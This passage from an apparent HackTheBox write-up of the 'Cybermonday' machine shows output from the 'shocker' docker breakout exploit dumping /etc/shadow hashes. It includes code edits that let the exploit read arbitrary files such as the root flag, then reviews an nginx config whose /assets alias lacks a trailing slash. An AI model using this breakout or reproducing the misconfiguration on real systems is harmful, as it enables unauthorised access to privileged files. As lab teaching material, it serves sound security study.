[*] Found dev
[*] Found lost+found
[*] Found initrd.img.old
[*] Found etc
[+] Match: etc ino=129793
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0xfb, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found X11
[*] Found tmpfiles.d
[*] Found mailcap.order
[*] Found python3
[*] Found bash_completion
[*] Found cron.d
[*] Found ld.so.cache
[*] Found cron.hourly
[*] Found dhcp
[*] Found docker
[*] Found sudo.conf
[*] Found manpath.config
[*] Found pam.d
[*] Found motd
[*] Found network
[*] Found networks
[*] Found ld.so.conf.d
[*] Found discover-modprobe.conf
[*] Found cron.daily
[*] Found initramfs-tools
[*] Found subuid
[*] Found audit
[*] Found rc1.d
[*] Found debconf.conf
[*] Found grub.d
[*] Found security
[*] Found rcS.d
[*] Found rsyslog.d
[*] Found python3.9
[*] Found reportbug.conf
[*] Found passwd-
[*] Found ..
[*] Found locale.gen
[*] Found dictionaries-common
[*] Found modprobe.d
[*] Found rc3.d
[*] Found kernel-img.conf
[*] Found ssh
[*] Found passwd
[*] Found rsyslog.conf
[*] Found e2scrub.conf
[*] Found debian_version
[*] Found gshadow
[*] Found .pwd.lock
[*] Found ssl
[*] Found default
[*] Found sv
[*] Found xattr.conf
[*] Found logrotate.d
[*] Found apt
[*] Found sudo_logsrvd.conf
[*] Found ld.so.conf
[*] Found sudoers
[*] Found .
[*] Found binfmt.d
[*] Found needrestart
[*] Found group-
[*] Found update-motd.d
[*] Found fuse.conf
[*] Found inputrc
[*] Found rc4.d
[*] Found logrotate.conf
[*] Found rc5.d
[*] Found issue
[*] Found mime.types
[*] Found profile
[*] Found hosts.deny
[*] Found shadow
[+] Match: shadow ino=132390
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x26, 0x05, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x26, 0x05, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
root:$y$j9T$kndrQlLwiIgjD3Jegw0bP0$8gT7HQZoAIe6owK9kIDzj4qriqKfygMooOkk5go9i40:19506:0:99999:7:::
daemon:*:19506:0:99999:7:::
bin:*:19506:0:99999:7:::
sys:*:19506:0:99999:7:::
sync:*:19506:0:99999:7:::
games:*:19506:0:99999:7:::
man:*:19506:0:99999:7:::
lp:*:19506:0:99999:7:::
mail:*:19506:0:99999:7:::
news:*:19506:0:99999:7:::
uucp:*:19506:0:99999:7:::
proxy:*:19506:0:99999:7:::
www-data:*:19506:0:99999:7:::
backup:*:19506:0:99999:7:::
list:*:19506:0:99999:7:::
irc:*:19506:0:99999:7:::
gnats:*:19506:0:99999:7:::
nobody:*:19506:0:99999:7:::
_apt:*:19506:0:99999:7:::
systemd-network:*:19506:0:99999:7:::
systemd-resolve:*:19506:0:99999:7:::
messagebus:*:19506:0:99999:7:::
systemd-timesync:*:19506:0:99999:7:::
sshd:*:19506:0:99999:7:::
john:$y$j9T$GjbNtuqeiU3F8AVjXki/F1$E.mwZgDhVYWBR8UfeQDDO91/Z8cGKOW.ec0iK9Xj017:19569:0:99999:7:::
systemd-coredump:!*:19506::::::
_laurel:!:19572::::::

```

The output is long, but it ends with `/etc/shadow`!

#### Any File

I don’t just want to read `/etc/passwd`. I’ll update the `main` function to take args:

```

int main(int argc, char* argv[])

```

I’ll also update the file being read:

```

        if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
                die("[-] Cannot find valid handle!");

```

For completeness, I’ll update the success print:

```

        fprintf(stderr, "[!] Win! %s output follows:\n%s\n", argv[1], buf);

```

I’ll upload, compile, and run, this time with an arg (as I did not checks, it just crashes with no arg):

```

root@e879159934d1:/var/www/html# ./shocker /root/root.txt              
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'root/root.txt'
[*] Found lib
[*] Found boot
[*] Found libx32
[*] Found bin
[*] Found vmlinuz.old
[*] Found initrd.img
[*] Found ..
[*] Found root
[+] Match: root ino=20
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'root.txt'
[*] Found ..
[*] Found .
[*] Found .profile
[*] Found .local
[*] Found root.txt
[+] Match: root.txt ino=38
[*] Brute forcing remaining 32bit. This can take a while...
[*] (root.txt) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x26, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /root/root.txt output follows:
2f076cf2************************

```

There’s the root flag!

### Priv #3 Kernel Module

It would be disappointing for a HackTheBox machine to grant only file read and not a root shell. Typically, HTB would at least leave a root SSH key or make the root password crackable, but that’s not the case here.

The intended way to get execution is to do the same escalation I showed in [Monitors](/2021/10/09/htb-monitors.html#shell-as-root), but using capabilities in the container to load a kernel module.

I won’t show it here, as it’s the same as monitors. The only extra trick (which is by no means trivial) is getting the kernel image and headers along with things like `insmod` and the packages it requires installed in the container so that the exploit can be compiled and loaded.

## Beyond Root

### Modifying PyJWT

The Python JWT library has safe guards in place to prevent developers from making mistakes that would lead to algorithm confusion vulnerabilities. I ran into those [above](#sign-jwt-fail) and switched to a tool designed for offensive JWT generation and manipulation, `jwt_tool` .

Still, it’s a good exercise to understand how these protections are in place, and if I can modify the library to let me past the guard rail. That’s what I’ll do in [this video](https://www.youtube.com/watch?v=uzHXHaRFckE):

### nginx Config

Given the off-by-slash vulnerability at the start of the box, I wanted to check the nginx config now that I have root access.

There are six docker containers, matching what I identified with `nmap`:

```

root@cybermonday:~# docker ps
CONTAINER ID   IMAGE             COMMAND                  CREATED        STATUS       PORTS                 NAMES
e1862f4e1242   cybermonday_api   "docker-php-entrypoi…"   4 months ago   Up 2 weeks                         cybermonday_api_1
e9eb887a4ca9   registry:latest   "/entrypoint.sh /etc…"   4 months ago   Up 2 weeks   5000/tcp              cybermonday_registry_1
d91450e894df   nginx:latest      "/docker-entrypoint.…"   4 months ago   Up 2 weeks   0.0.0.0:80->80/tcp    cybermonday_nginx_1
070370e2cdc4   cybermonday_app   "docker-php-entrypoi…"   4 months ago   Up 2 weeks   9000/tcp              cybermonday_app_1
743ed0a8f73d   mysql:latest      "docker-entrypoint.s…"   4 months ago   Up 2 weeks   3306/tcp, 33060/tcp   cybermonday_db_1
a2cbf3bec867   redis:latest      "docker-entrypoint.s…"   4 months ago   Up 2 weeks   6379/tcp              cybermonday_redis_1

```

I’ll get a shell in the nginx container:

```

root@cybermonday:~# docker exec -it cybermonday_nginx_1 bash
root@d91450e894df:/#

```

There is no `sites-available` / `sites-enabled` folders as I’m used to seeing:

```

root@d91450e894df:/etc/nginx# ls
conf.d  fastcgi_params  includes  mime.types  modules  nginx.conf  scgi_params  uwsgi_params

```

The webservers are defined in `conf.d/default.conf`. The first is for the api:

```

server {
    listen 80;

    server_name webhooks-api-beta.cybermonday.htb;

    location / {
        proxy_pass http://api;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

```

If the `server_name` matches, then it proxies it over to `http://api`.

Next is the default server:

```

server {
    listen 80 default_server;

    server_name _;

    charset UTF-8;

    location / {
        return 301 http://cybermonday.htb;
    }

    access_log off;
    log_not_found off;
    error_log  /var/log/nginx/error.log error;
}

```

For any server name that doesn’t match another, it returns a 301 redirect to `http://cybermonday.htb`.

The final server is for `cybermonday.htb`:

```

server {
    listen 80;
    server_name cybermonday.htb;
    root /var/www/html/public;

    index index.php index.html index.htm;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location /assets {
        alias /var/www/html/resources/;
    }

    location ~ \.php$ {
        try_files $uri /index.php =404;
        fastcgi_pass app:9000;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

```

For a request to `/`, it tries to find a file at the URI, URI plus slash, and at `index.php`. For anything ending in `.php`, it passes it to the app on port 9000.

The vulnerability is in the `location /assets`. That should have a trailing `/`. Without it, I can do what I did above.